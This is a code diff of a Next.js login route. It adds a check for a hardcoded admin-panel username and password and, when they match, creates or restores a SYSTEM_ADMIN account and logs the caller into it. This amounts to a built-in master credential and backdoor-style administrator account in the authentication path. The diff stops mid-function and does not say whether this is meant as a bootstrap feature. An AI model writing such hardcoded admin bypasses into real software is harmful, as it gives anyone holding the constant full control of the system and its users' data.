@@ -3,6 +3,11 @@ import { prisma } from "@/lib/prisma";
 import { toSafeUser } from "@/lib/auth";
 import { verifyPassword } from "@/lib/password";
 import { setSessionCookie } from "@/lib/session";
+import {
+  ADMIN_PANEL_PASSWORD,
+  ADMIN_PANEL_USERNAME,
+} from "@/lib/admin-panel";
+import { ensureAdminPanelUser } from "@/lib/ensure-admin-panel";
 
 export async function POST(req: NextRequest) {
   let body: { username?: string; password?: string };
@@ -23,7 +28,24 @@ export async function POST(req: NextRequest) {
   }
 
   try {
-    const user = await prisma.user.findUnique({ where: { username } });
+    let lookup = username;
+    if (
+      username.toUpperCase() === ADMIN_PANEL_USERNAME &&
+      password === ADMIN_PANEL_PASSWORD
+    ) {
+      const existing = await prisma.user.findUnique({
+        where: { username: ADMIN_PANEL_USERNAME },
+        select: { passwordHash: true, systemRole: true, status: true },
+      });
+      const ready =
+        existing?.status === "ACTIVE" &&
+        existing.systemRole === "SYSTEM_ADMIN" &&
+        (await verifyPassword(password, existing.passwordHash));
+      if (!ready) await ensureAdminPanelUser(prisma);
+      lookup = ADMIN_PANEL_USERNAME;
+    }
+
+    const user = await prisma.user.findUnique({ where: { username: lookup } });
 
     // Generic failure — do not reveal whether username exists.
     if (!user) {
